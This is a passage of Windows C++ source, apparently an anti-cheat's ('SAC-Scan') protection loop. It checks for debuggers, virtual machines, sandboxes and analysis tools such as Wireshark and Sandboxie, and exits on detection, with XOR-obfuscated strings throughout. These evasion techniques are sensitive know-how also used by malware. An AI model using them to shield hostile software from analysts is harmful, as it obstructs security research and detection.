		auto h = CreateFileA(drivers[i], 0, 0, 0, OPEN_EXISTING, 0, 0);
		if (h != INVALID_HANDLE_VALUE)
		{
			CloseHandle(h);
			return true;
		}
	}
	return false;
}

WORD GetVersionWord()
{
	OSVERSIONINFO verInfo = { sizeof(OSVERSIONINFO) };
	GetVersionEx(&verInfo);
	return MAKEWORD(verInfo.dwMinorVersion, verInfo.dwMajorVersion);
}
BOOL IsWin8OrHigher() { return GetVersionWord() >= _WIN32_WINNT_WIN8; }
BOOL IsVistaOrHigher() { return GetVersionWord() >= _WIN32_WINNT_VISTA; }

__forceinline PVOID GetPEB64()
{
	PVOID pPeb = 0;
#ifndef _WIN64
	// 1. There are two copies of PEB - PEB64 and PEB32 in WOW64 process
	// 2. PEB64 follows after PEB32
	// 3. This is true for version less then Windows 8, else __readfsdword returns address of real PEB64
	if (IsWin8OrHigher())
	{
		BOOL isWow64 = FALSE;
		typedef BOOL(WINAPI *pfnIsWow64Process)(HANDLE hProcess, PBOOL isWow64);
		pfnIsWow64Process fnIsWow64Process = (pfnIsWow64Process)
			GetProcAddress(GetModuleHandleA("Kernel32.dll"), "IsWow64Process");
		if (fnIsWow64Process(GetCurrentProcess(), &isWow64))
		{
			if (isWow64)
			{
				pPeb = (PVOID)__readfsdword(0x0C * sizeof(PVOID));
				pPeb = (PVOID)((PBYTE)pPeb + 0x1000);
			}
		}
	}
#endif
	return pPeb;
}

PVOID GetPEB()
{
#ifdef _WIN64
	return (PVOID)__readgsqword(0x0C * sizeof(PVOID));
#else
	return (PVOID)__readfsdword(0x0C * sizeof(PVOID));
#endif
}

// 5.1
// Reference:
// ScoopyNG - The VMware detection tool - Version v1.0 - Tobias Klein, 2008 - www.trapkit.de
__forceinline void sidt()
{
	unsigned char	idtr[6];
	unsigned long	idt = 0;

	_asm sidt idtr
	idt = *((unsigned long *)&idtr[2]);

	if ((idt >> 24) == 0xff)
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#88 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	}
	else
	{

	}

}

// 5.1
// Reference:
// ScoopyNG - The VMware detection tool - Version v1.0 - Tobias Klein, 2008 - www.trapkit.de
__forceinline void sldt()
{
	unsigned char   ldtr[5] = "\xef\xbe\xad\xde";
	unsigned long   ldt = 0;

	_asm sldt ldtr
	ldt = *((unsigned long *)&ldtr[0]);

	if (ldt == 0xdead0000)
	{

	}
	else
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#87 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	}
}

// 5.1
// Reference:
// ScoopyNG - The VMware detection tool - Version v1.0 - Tobias Klein, 2008 - www.trapkit.de
__forceinline void sgdt()
{
	unsigned char   gdtr[6];
	unsigned long   gdt = 0;

	_asm sgdt gdtr
	gdt = *((unsigned long *)&gdtr[2]);

	if ((gdt >> 24) == 0xff)
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#86 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	}
	else
	{

	}

}

// 5.1
// Reference:
// ScoopyNG - The VMware detection tool - Version v1.0 - Tobias Klein, 2008 - www.trapkit.de
__forceinline void str()
{
	unsigned char	mem[4] = { 0, 0, 0, 0 };

	__asm str mem;

	if ((mem[0] == 0x00) && (mem[1] == 0x40))
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#85 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	}
	else
	{

	}
}

// 5.1
// Reference
// http://www.offensivecomputing.net/ Written by Danny Quist, Offensive Computing
__forceinline void smsw()
{
	unsigned int reax = 0;

	__asm
	{
		mov eax, 0xCCCCCCCC;
		smsw eax;
		mov DWORD PTR[reax], eax;
	}

	if ((((reax >> 24) & 0xFF) == 0xcc) && (((reax >> 16) & 0xFF) == 0xcc))
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#84 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	}
	else
	{

	}
}

// 5.2
// Reference: ScoopyNG - The VMware detection tool - Version v1.0 - Tobias Klein, 2008 - www.trapkit.de
__forceinline void vmware_get_memory()
{
	unsigned int	a = 0;

	__try {
		__asm {
			push eax
			push ebx
			push ecx
			push edx

			mov eax, 'VMXh'
			mov ecx, 14h
			mov dx, 'VX'
			in eax, dx
			mov a, eax

			pop edx
			pop ecx
			pop ebx
			pop eax
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {}

	if (a > 0)
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#82 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	}
	else
	{

	}
}

// 5.2
// Reference: ScoopyNG - The VMware detection tool - Version v1.0 - Tobias Klein, 2008 - www.trapkit.de
__forceinline void vmware_get_version()
{
	unsigned int	a, b;

	__try {
		__asm {
			push eax
			push ebx
			push ecx
			push edx

			mov eax, 'VMXh'
			mov ecx, 0Ah
			mov dx, 'VX'
			in eax, dx
			mov a, ebx
			mov b, ecx

			pop edx
			pop ecx
			pop ebx
			pop eax
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {}

	if (a == 'VMXh')
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#81 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	}
	else
	{

	}
}

// 5.3
// Reference:
// http://www.codeproject.com/system/VmDetect.asp
DWORD __forceinline IsInsideVPC_exceptionFilter(_EXCEPTION_POINTERS *ep)
{
	PCONTEXT ctx = ep->ContextRecord;

	ctx->Ebx = -1; // Not running VPC
	ctx->Eip += 4; // skip past the "call VPC" opcodes
	return EXCEPTION_CONTINUE_EXECUTION;
	// we can safely resume execution since we skipped faulty instruction
}

// From Elias Bachaalany's Codeproject.com post:
// http://www.codeproject.com/system/VmDetect.asp
__forceinline BOOL virtualpc_detect()
{
	bool rc = false;

	__try {
		__asm {
			push eax
			push ebx
			push ecx
			push edx

			mov ebx, 0h
			mov eax, 01h

			__emit 0Fh
			__emit 3Fh
			__emit 07h
			__emit 0Bh

			test ebx, ebx
			setz[rc]

			pop edx
			pop ecx
			pop ebx
			pop eax
		}
	}
	__except (IsInsideVPC_exceptionFilter(GetExceptionInformation()))
	{
		rc = false;
	}
	return rc;
}

__forceinline void fSetUnhandledExceptionFilter()
{

	SetUnhandledExceptionFilter(NULL);
	_asm int 3;
	char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
	Encrypt(ntdll1, sizeof(ntdll1));
	char* begin1 = ntdll1;   // Points to string beggining
	char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
	std::replace(begin1, end1, '4', 't');
	char ntdll[] = "hxld%nsn";
	Encrypt(ntdll, sizeof(ntdll));
	GetProcId(ntdll);
	MessageBox(NULL, "#95 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
	Sleep(30);
	exit(1);
}

__forceinline void sGetTickCount()
{
	DWORD initial = NULL;
	DWORD end = NULL;

	initial = GetTickCount();
	end = GetTickCount();
	if ((initial - end) >= 10)
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#94 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	}
	else
	{
		Sleep(40);
	}
}

__forceinline void stimeGetTime()
{
	DWORD initial = NULL;
	DWORD end = NULL;

	initial = timeGetTime();
	end = timeGetTime();
	if ((initial - end) >= 10)
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#93 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	}
	else
	{
		Sleep(40);
	}
}

__forceinline void sGetSystemTime()
{

	SYSTEMTIME initial, end;
	FILETIME finitial, fend;
	GetSystemTime(&initial);
	GetSystemTime(&end);
	SystemTimeToFileTime(&initial, &finitial);
	SystemTimeToFileTime(&end, &fend);
	if (((finitial.dwHighDateTime - fend.dwHighDateTime) > 10) || ((finitial.dwLowDateTime - fend.dwLowDateTime) > 10))
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#92 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	}
	else
	{
		Sleep(40);
	}
}

__forceinline void sGetLocalTime()
{

	SYSTEMTIME initial, end;
	FILETIME finitial, fend;
	GetLocalTime(&initial);
	GetLocalTime(&end);
	SystemTimeToFileTime(&initial, &finitial);
	SystemTimeToFileTime(&end, &fend);
	if (((finitial.dwHighDateTime - fend.dwHighDateTime) > 10) || ((finitial.dwLowDateTime - fend.dwLowDateTime) > 10))
	{
		char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
		Encrypt(ntdll1, sizeof(ntdll1));
		char* begin1 = ntdll1;   // Points to string beggining
		char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
		std::replace(begin1, end1, '4', 't');
		char ntdll[] = "hxld%nsn";
		Encrypt(ntdll, sizeof(ntdll));
		GetProcId(ntdll);
		MessageBox(NULL, "#91 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
		Sleep(30);
		exit(1);
	}
	else
	{
		Sleep(40);
	}
}



BOOL isdbg = FALSE;
void AntiDebug()
{

	JUNK_CODE_ONE
		JUNK_CODE_TWO
		while (1)
		{
			sGetLocalTime();
			sGetSystemTime();
			stimeGetTime();
			sGetTickCount();
			CheckRemoteDebuggerPresent(GetCurrentProcess(), &isdbg);
			if (isdbg)
			{
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#90 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
			PVOID pPeb = GetPEB();
			PVOID pPeb64 = GetPEB64();
			DWORD offsetNtGlobalFlag = 0;
			offsetNtGlobalFlag = 0x68;
			DWORD NtGlobalFlag = *(PDWORD)((PBYTE)pPeb + offsetNtGlobalFlag);
			if (NtGlobalFlag & NT_GLOBAL_FLAG_DEBUGGED)
			{
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#74 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
			if (pPeb64)
			{
				DWORD NtGlobalFlagWow64 = *(PDWORD)((PBYTE)pPeb64 + 0xBC);
				if (NtGlobalFlagWow64 & NT_GLOBAL_FLAG_DEBUGGED)
				{
					char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
					Encrypt(ntdll1, sizeof(ntdll1));
					char* begin1 = ntdll1;   // Points to string beggining
					char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
					std::replace(begin1, end1, '4', 't');
					char ntdll[] = "hxld%nsn";
					Encrypt(ntdll, sizeof(ntdll));
					GetProcId(ntdll);
					MessageBox(NULL, "#75 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
					Sleep(30);
					exit(1);
				}
			}
			if (IsDebuggerPresent())
			{
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#24 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
			if (DebuggerDriversPresent())
			{
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#37 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
			PBYTE pImageBase = (PBYTE)GetModuleHandle(NULL);
			PIMAGE_NT_HEADERS pImageNtHeaders = GetImageNtHeaders(pImageBase);
			PIMAGE_LOAD_CONFIG_DIRECTORY pImageLoadConfigDirectory = (PIMAGE_LOAD_CONFIG_DIRECTORY)(pImageBase
				+ pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress);
			if (pImageLoadConfigDirectory->GlobalFlagsClear != 0)
			{
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#23 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
			ClasseCheckWindow();
			__asm
			{
				// set SEH handler
				push ExceptionRoutine
				push dword ptr fs : [0]
				mov  dword ptr fs : [0], esp
			}
			CloseHandle((HANDLE)0xBAAD);
			__asm
			{
				// return original SEH handler
				mov  eax, [esp]
				mov  dword ptr fs : [0], eax
				add  esp, 8
			}
			unsigned int time1 = 0;
			unsigned int time2 = 0;
			__asm
			{
				RDTSC
				MOV time1, EAX
				RDTSC
				MOV time2, EAX

			}
			if ((time2 - time1) > 100)
			{
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#21 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
			if (IsitaSandBox() == true)
			{
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#20 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
			HWND snd;

			if ((snd = FindWindow("SandboxieControlWndClass", NULL))) {
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#19 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
			if ((snd = FindWindow("Afx:400000:0", NULL))) {
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#18 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
			if ((snd = FindWindow("The Wireshark Network Analyzer", NULL))) {
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#17 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
			if ((snd = FindWindow("WPE PRO", NULL))) {
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#16 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
			//method 1
			HKEY HK = 0;
			if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\DSDT\\VBOX__", 0, KEY_READ, &HK) == ERROR_SUCCESS)
			{
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#15 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
			HK = 0;
			char* subkey = "SYSTEM\\CurrentControlSet\\Enum\\IDE";
			if ((ERROR_SUCCESS == RegOpenKeyEx(HKEY_LOCAL_MACHINE, subkey, 0, KEY_READ, &HK)) && HK)
			{
				unsigned long n_subkeys = 0;
				unsigned long max_subkey_length = 0;
				if (ERROR_SUCCESS == RegQueryInfoKey(HK, 0, 0, 0, &n_subkeys, &max_subkey_length, 0, 0, 0, 0, 0, 0))
				{
					if (n_subkeys)  //Usually n_subkeys are 2
					{
						char* pNewKey = (char*)LocalAlloc(LMEM_ZEROINIT, max_subkey_length + 1);
						for (unsigned long i = 0; i < n_subkeys; i++)  //Usually n_subkeys are 2
						{
							memset(pNewKey, 0, max_subkey_length + 1);
							HKEY HKK = 0;
							if (ERROR_SUCCESS == RegEnumKey(HK, i, pNewKey, max_subkey_length + 1))
							{
								if ((RegOpenKeyEx(HK, pNewKey, 0, KEY_READ, &HKK) == ERROR_SUCCESS) && HKK)
								{
									unsigned long nn = 0;
									unsigned long maxlen = 0;
									RegQueryInfoKey(HKK, 0, 0, 0, &nn, &maxlen, 0, 0, 0, 0, 0, 0);
									char* pNewNewKey = (char*)LocalAlloc(LMEM_ZEROINIT, maxlen + 1);
									if (RegEnumKey(HKK, 0, pNewNewKey, maxlen + 1) == ERROR_SUCCESS)
									{
										HKEY HKKK = 0;
										if (RegOpenKeyEx(HKK, pNewNewKey, 0, KEY_READ, &HKKK) == ERROR_SUCCESS)
										{
											unsigned long size = 0xFFF;
											unsigned char ValName[0x1000] = { 0 };
											if (RegQueryValueEx(HKKK, "FriendlyName", 0, 0, ValName, &size) == ERROR_SUCCESS)
											{
												ToLower(ValName);
												if (strstr((char*)ValName, "vbox"))
												{
													char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
													Encrypt(ntdll1, sizeof(ntdll1));
													char* begin1 = ntdll1;   // Points to string beggining
													char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
													std::replace(begin1, end1, '4', 't');
													char ntdll[] = "hxld%nsn";
													Encrypt(ntdll, sizeof(ntdll));
													GetProcId(ntdll);
													MessageBox(NULL, "#14 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
													Sleep(30);
													exit(1);
												}
											}
											RegCloseKey(HKKK);
										}
									}
									LocalFree(pNewNewKey);
									RegCloseKey(HKK);
								}
							}
						}
						LocalFree(pNewKey);
					}
				}
				RegCloseKey(HK);
			}
			HK = 0;
			if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &HK) == ERROR_SUCCESS)
			{
				unsigned long type = 0;
				unsigned long size = 0x100;
				char* systembiosversion = (char*)LocalAlloc(LMEM_ZEROINIT, size + 10);
				if (ERROR_SUCCESS == RegQueryValueEx(HK, "SystemBiosVersion", 0, &type, (unsigned char*)systembiosversion, &size))
				{
					ToLower((unsigned char*)systembiosversion);
					if (type == REG_SZ || type == REG_MULTI_SZ)
					{
						if (strstr(systembiosversion, "vbox"))
						{
							char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
							Encrypt(ntdll1, sizeof(ntdll1));
							char* begin1 = ntdll1;   // Points to string beggining
							char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
							std::replace(begin1, end1, '4', 't');
							char ntdll[] = "hxld%nsn";
							Encrypt(ntdll, sizeof(ntdll));
							GetProcId(ntdll);
							MessageBox(NULL, "#13 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
							Sleep(30);
							exit(1);
						}
					}
				}
				LocalFree(systembiosversion);

				type = 0;
				size = 0x200;
				char* videobiosversion = (char*)LocalAlloc(LMEM_ZEROINIT, size + 10);
				if (ERROR_SUCCESS == RegQueryValueEx(HK, "VideoBiosVersion", 0, &type, (unsigned char*)videobiosversion, &size))
				{
					if (type == REG_MULTI_SZ)
					{
						char* video = videobiosversion;
						while (*(unsigned char*)video)
						{
							ToLower((unsigned char*)video);
							if (strstr(video, "oracle") || strstr(video, "virtualbox"))
							{
								char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
								Encrypt(ntdll1, sizeof(ntdll1));
								char* begin1 = ntdll1;   // Points to string beggining
								char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
								std::replace(begin1, end1, '4', 't');
								char ntdll[] = "hxld%nsn";
								Encrypt(ntdll, sizeof(ntdll));
								GetProcId(ntdll);
								MessageBox(NULL, "#12 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
								Sleep(30);
								exit(1);
							}
							video = &video[strlen(video) + 1];
						}
					}
				}
				LocalFree(videobiosversion);
				RegCloseKey(HK);
			}
			HKEY hk = 0;
			int ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\mssmbios\\data", 0, KEY_ALL_ACCESS, &hk);
			if (ret == ERROR_SUCCESS)
			{
				unsigned long type = 0;
				unsigned long length = 0;
				ret = RegQueryValueEx(hk, "SMBiosData", 0, &type, 0, &length);
				if (ret == ERROR_SUCCESS)
				{
					if (length)
					{
						char* p = (char*)LocalAlloc(LMEM_ZEROINIT, length);
						if (p)
						{
							ret = RegQueryValueEx(hk, "SMBiosData", 0, &type, (unsigned char*)p, &length);
							if (ret == ERROR_SUCCESS)
							{
								char Tits[] = "BEED_N@+LFIC";
								Encrypt(Tits, sizeof(Tits));

								char Tits1[] = "]BY_^JGIDS";
								Encrypt(Tits1, sizeof(Tits1));

								char Tits2[] = "X^E+FBHYDXRX_NFX";
								Encrypt(Tits2, sizeof(Tits2));

								char Tits3[] = "]BY_^JG+FJHCBEN";
								Encrypt(Tits3, sizeof(Tits3));

								char Tits4[] = "]IDS]NY";
								Encrypt(Tits4, sizeof(Tits4));

								AllToUpper(p, length);
								unsigned char* x1 = ScanDataForString((unsigned char*)p, length, (unsigned char*)Tits);
								unsigned char* x2 = ScanDataForString((unsigned char*)p, length, (unsigned char*)Tits1);
								unsigned char* x3 = ScanDataForString((unsigned char*)p, length, (unsigned char*)Tits2);
								unsigned char* x4 = ScanDataForString((unsigned char*)p, length, (unsigned char*)Tits3);
								unsigned char* x5 = ScanDataForString((unsigned char*)p, length, (unsigned char*)Tits4);
								if (x1 || x2 || x3 || x4 || x5)
								{
									if (x1) printf("%s\r\n", x1);
									if (x2) printf("%s\r\n", x2);
									if (x3) printf("%s\r\n", x3);
									if (x4) printf("%s\r\n", x4);
									if (x5) printf("%s\r\n", x5);
								}
							}
							LocalFree(p);
						}
					}
				}
				RegCloseKey(hk);
			}
			if (DebugObjectCheck())
			{
				char ntdll1[] = "Nyydy1+XJH+&+Xjljje+Je⌂bHcnj⌂";
				Encrypt(ntdll1, sizeof(ntdll1));
				char* begin1 = ntdll1;   // Points to string beggining
				char* end1 = ntdll1 + strlen(ntdll1); // Points to string end
				std::replace(begin1, end1, '4', 't');
				char ntdll[] = "hxld%nsn";
				Encrypt(ntdll, sizeof(ntdll));
				GetProcId(ntdll);
				MessageBox(NULL, "#11 SAC-Scan\n\nAn illegal choice has been detected!", ntdll1, MB_OK);
				Sleep(30);
				exit(1);
			}
